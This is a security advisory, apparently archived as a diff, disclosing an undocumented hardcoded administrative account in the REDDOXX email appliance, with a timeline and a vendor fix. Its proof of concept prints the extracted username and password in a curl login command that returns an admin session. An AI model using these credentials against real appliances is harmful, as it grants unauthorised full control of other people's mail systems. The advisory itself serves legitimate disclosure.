@@ -1,0 +1,128 @@
+id: 28189
+date: 07/25/2017
+title: REDDOXX Appliance Undocumented Administrative Service Account Vulnerability
+author: RedTeam
+cves: 
+
+Undocumented Administrative Service Account in REDDOXX Appliance
+
+RedTeam Pentesting discovered an undocumented service account in the
+REDDOXX appliance software, which allows attackers to access the
+administrative interface of the appliance and change its configuration.
+
+
+Details
+=======
+
+Product: REDDOXX Appliance
+Affected Versions: Build 2032 / v2.0.625, older versions likely affected too
+Fixed Versions: Version 2032 SP2
+Vulnerability Type: Hidden Service Account
+Security Risk: high
+Vendor URL: https://www.reddoxx.com/
+Vendor Status: patch available
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2017-007
+Advisory Status: published
+CVE: GENERIC-MAP-NOMATCH
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH
+
+
+Introduction
+============
+
+"REDDOXX is a leading supplier of solutions for e-mail archiving,
+encrypted and digitally signed e-mail traffic as well as spam
+protection. Our focus is on technological innovation: taking our cue
+from our clientsa requirements our competent and quality-conscious
+employees strive to offer you the best possible products at all times.
+Using stringent quality standards and proven processes we keep
+developing our company and products continuously, with the goal of
+continuous improvement."
+
+(from the vendor's homepage)
+
+
+More Details
+============
+
+Through the ISO provided on the vendor's homepage [1], it was possible
+to analyze the files in a typical REDDOXX appliance [0] installation. As
+part of this process, hardcoded credentials for a service account were
+found in a .NET binary file. With these credentials, it was possible to
+authenticate against the administrative interface.
+
+
+Proof of Concept
+================
+
+The following curl command-line shows an unsuccessful login attempt with
+invalid credentials against the administrative interface:
+
+------------------------------------------------------------------------
+$ curl --silent -H 'Content-Type: application/json' --data '{"UserName": "redteam@local", "Password":"redteam"}' http://www.example.com/api/v1/proxy/auth/credentials | jq .
+{
+  "ResponseStatus": {
+    "ErrorCode": "Unauthorized",
+    "Message": "Invalid UserName or Password",
+    "Errors": []
+  }
+}
+------------------------------------------------------------------------
+
+
+When the credentials extracted from the binaries are provided however,
+the webserver returns a session ID instead of an error message,
+indicating a successful login:
+
+------------------------------------------------------------------------
+$ curl --silent -H 'Content-Type: application/json' --data '{"UserName": "rdx-build-in-service-user@local", "Password":"rdx!1ntern4l"}' http://www.example.com/api/v1/proxy/auth/credentials | jq .
+{
+  "SessionId": "Qm5odfSFB2tVh8De6HjD",
+  "UserName": "rdx-build-in-service-user@local",
+  "DisplayName": "",
+  "ResponseStatus": {}
+}
+------------------------------------------------------------------------
+
+
+Workaround
+==========
+
+None
+
+
+Fix
+===
+
+Update the appliance software to Version 2032 SP2.
+
+
+Security Risk
+=============
+
+The hidden service account allows attackers to authenticate to the
+administrative interface of the appliance. With this level of access,
+the appliance can be completely reconfigured. For example, core
+functionalities, such as spam filtering or archiving, can be disabled.
+RedTeam Pentesting assumes that the hidden service account is present
+on all REDDOXX installations and rates its presence as a high risk.
+
+
+Timeline
+========
+
+2017-05-17 Vulnerability identified
+2017-05-23 Customer approved disclosure of vulnerability
+2017-05-26 Customer provided details of vulnerability to vendor
+2017-06-21 Vulnerability reported as fixed by vendor
+2017-07-24 Advisory released
+
+
+References
+==========
+
+[0] https://www.reddoxx.com/en/
+[1] https://my.reddoxx.com/documents/manual/en/custdl/product-downloads
+    (Requires login)
+
+#  0day.today [2023-03-27]  #
